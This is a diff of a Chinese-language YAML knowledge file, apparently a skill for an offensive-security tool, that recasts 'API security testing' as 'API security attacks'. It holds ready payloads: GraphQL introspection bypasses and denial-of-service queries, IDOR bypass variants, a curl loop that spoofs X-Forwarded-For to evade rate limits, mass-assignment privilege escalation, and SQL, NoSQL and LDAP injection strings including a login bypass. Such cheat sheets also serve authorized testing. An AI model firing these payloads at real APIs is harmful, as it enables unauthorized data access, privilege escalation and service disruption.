@@ -1,32 +1,147 @@
-name: API安全测试
-description: REST API、GraphQL安全测试技术
+name: API安全攻击
+description: REST API、GraphQL、gRPC安全攻击技术
 domain: web
-version: '1.0'
+version: '3.0'
 tags:
 - web
 - api
 - rest
 - graphql
-knowledge: "# API安全详细分类\n\n## 1. GraphQL安全\n\n### 端点发现\n\n```\n/graphql\n/api/graphql\n/graphql/api\n/query\n/graphql.php\n\
-  ```\n\n### 内省查询\n\n```graphql\nquery IntrospectionQuery {\n  __schema {\n    types {\n      name\n      kind\n      description\n\
-  \      fields {\n        name\n        type {\n          name\n        }\n        args {\n          name\n          type\
-  \ {\n            name\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n### 绕过内省\n\n```graphql\nquery { __schema {\
-  \ types { name } } }\n{\"query\":\"{__schema{types{name}}\"}\n```\n\n### 批量查询绕过速率限制\n\n```graphql\nquery {\n  user1: user(id:\
-  \ 1) { name }\n  user2: user(id: 2) { name }\n  user3: user(id: 3) { name }\n}\n```\n\n### 工具\n\n```bash\ngqlscan -u http://target.com/graphql\n\
-  inql -t http://target.com/graphql\ngraphql-cop -t http://target.com/graphql\n```\n\n---\n\n## 2. REST API安全\n\n### 端点发现\n\
-  \n```\n/api/v1/users\n/api/v2/products\n/api/docs\n/swagger.json\n/openapi.json\n```\n\n### 未授权访问\n\n```\ncurl http://target.com/api/v1/users\n\
-  curl -H \"X-API-Key: key\" http://target.com/api/users\n```\n\n### HTTP方法测试\n\n```\nOPTIONS /api/users\nPUT /api/users/1\n\
-  DELETE /api/users/1\nPATCH /api/users/1\n```\n\n---\n\n## 3. IDOR漏洞\n\n### 水平越权\n\n```\n/api/users/1 -> /api/users/2\nGET\
-  \ /api/profile?user_id=1 -> user_id=2\n```\n\n### 垂直越权\n\n```\n普通用户 -> 管理员操作\n```\n\n### 批量IDOR\n\n```\n/api/users/batch?ids=1,2,3,4,5\n\
-  ```\n\n### 绕过\n\n- 数字变体: `/api/users/001`\n- 编码: `/api/users/%31`\n- JSON: `{\"id\": 1, \"id\": 2}`\n\n---\n\n## 4. 速率限制绕过\n\
-  \n### IP轮换\n\n```bash\nfor i in $(seq 1 100); do\n  curl -H \"X-Forwarded-For: 1.2.3.$i\" http://target.com/api/test\ndone\n\
-  ```\n\n### Header污染\n\n```\nX-Forwarded-For: 1.1.1.1\nX-Real-IP: 1.1.1.1\nX-Originating-IP: 1.1.1.1\nClient-IP: 1.1.1.1\n\
-  ```\n\n### 代理池\n\n### 用户代理轮换\n\n---\n\n## 5. 批量赋值 (Mass Assignment)\n\n### 探测\n\n```json\nPOST /api/users\n{\"name\": \"\
-  test\", \"email\": \"test@test.com\"}\n\n响应:\n{\"id\": 1, \"name\": \"test\", \"email\": \"test@test.com\", \"role\": \"\
-  user\", \"isAdmin\": false}\n```\n\n### 利用\n\n```json\nPOST /api/users\n{\"name\": \"test\", \"role\": \"admin\", \"isAdmin\"\
-  : true}\n\nPUT /api/users/1\n{\"role\": \"admin\"}\n```\n\n---\n\n## 6. BOLA (Broken Object Level Authorization)\n\n###\
-  \ 对象枚举\n\n```\n/api/users/1\n/api/users/2\n/api/users/3\n```\n\n### 参数污染\n\n```\n/api/users?id=1&id=2\n/api/users[0]=1&users[1]=2\n\
-  ```\n\n---\n\n## 7. API注入\n\n### SQL注入\n\n```\n/api/users?name=admin'--\n/api/users?id=1 UNION SELECT--\n```\n\n### NoSQL注入\n\
-  \n```\n/api/users?name[$ne]=admin\n/api/users?name[$regex]=^admin\n```\n\n### JSON注入\n\n```\n{\"name\": \"admin\", \"role\"\
-  : \"admin\"}\n```\n\n---\n\n## 8. 工具\n\n```bash\n# RESTler\nrestler.py http://target.com/api\n\n# Postman\n# 导入API规范进行测试\n\
-  \n# Kiter\nkiter -u http://target.com/api\n```\n"
+
+knowledge: |
+  # API安全攻击
+
+  ## GraphQL攻击
+
+  ### 攻击思路
+  ```
+  内省查询获取Schema → 枚举敏感字段/Mutation → 构造恶意查询 → 提取数据/DoS
+  ```
+
+  ### 内省查询
+  ```graphql
+  query IntrospectionQuery {
+    __schema {
+      types { name kind fields { name args { name type { name } } } }
+      queryType { name }
+      mutationType { name }
+    }
+  }
+  ```
+
+  ### 内省绕过
+  ```graphql
+  # 方式1：片段绕过
+  { ...IntrospectionQuery }
+
+  # 方式2：字段别名
+  query { __schema { __typename } }
+
+  # 方式3：编码
+  {"query":"{__schema{types{name}}}","operationName":"IntrospectionQuery"}
+  ```
+
+  ### 批量查询DoS
+  ```graphql
+  # 单请求100次查询绕过限频
+  query {
+    u1: user(id:1) { name email }
+    u2: user(id:2) { name email }
+    ...
+    u100: user(id:100) { name email }
+  }
+  ```
+
+  ### 深度嵌套DoS
+  ```graphql
+  query DeepNesting {
+    user { posts { comments { author { posts { comments { ... } } } } }
+  }
+  ```
+
+  ### 字段枚举
+  ```graphql
+  # 枚举隐藏字段
+  query { __type(name:"User") { fields { name type { name } } } }
+  ```
+
+  ## REST API攻击
+
+  ### IDOR越权矩阵
+
+  | 类型 | 攻击方式 |
+  |------|----------|
+  | 水平越权 | /api/users/1 → /api/users/2 |
+  | 垂直越权 | user角色 → admin接口 |
+  | 批量越权 | ids[]=1,2,3,4,5 |
+  | GUID越权 | 预测/枚举UUID |
+
+  ### IDOR绕过
+  ```
+  # 数字变体
+  /api/users/1 → /api/users/001 → /api/users/1.0
+
+  # 编码绕过
+  /api/users/1 → /api/users/%31 → /api/users/0x31
+
+  # 参数污染
+  /api/users?id=1&id=2 → 返回id=2
+
+  # JSON数组
+  POST {"id":[1,2,3,4,5]}
+  ```
+
+  ### 速率限制绕过
+
+  | 方法 | 技术 |
+  |------|------|
+  | IP轮换 | X-Forwarded-For轮换 |
+  | Header污染 | X-Real-IP/Client-IP等 |
+  | 分布式 | 多IP并发请求 |
+  | 用户代理 | UA轮换 |
+
+  ```bash
+  # IP轮换
+  for i in $(seq 1 100); do
+    curl -H "X-Forwarded-For: 10.0.0.$i" http://target/api/test
+  done
+  ```
+
+  ### 批量赋值(Mass Assignment)
+  ```json
+  # 探测隐藏字段
+  POST /api/users {"name":"test"}
+  响应: {"id":1,"name":"test","role":"user","isAdmin":false}
+
+  # 尝试注入
+  POST /api/users {"name":"test","role":"admin","isAdmin":true}
+  PUT /api/users/1 {"role":"admin"}
+  ```
+
+  ## API注入攻击
+
+  | 注入类型 | Payload示例 |
+  |----------|-------------|
+  | SQL | /api/users?name=admin'-- |
+  | NoSQL | /api/users?name[$ne]=null |
+  | LDAP | /api/users?name=*)(uid=*))(|(uid=* |
+  | JSON | {"name":"admin\",\"role\":\"admin"} |
+
+  ### NoSQL注入
+  ```javascript
+  // MongoDB注入
+  ?name[$ne]=admin
+  ?name[$regex]=^admin
+  ?age[$gt]=0&age[$lt]=100
+  {"name":{"$ne":"admin"},"password":{"$ne":""}}
+  ```
+
+  ## 工具链
+
+  | 工具 | 用途 |
+  |------|------|
+  | gqlscan | GraphQL安全扫描 |
+  | inql | GraphQL内省分析 |
+  | graphql-cop | GraphQL漏洞检测 |
+  | RESTler | REST API模糊测试 |
+  | Postman | API测试平台 |
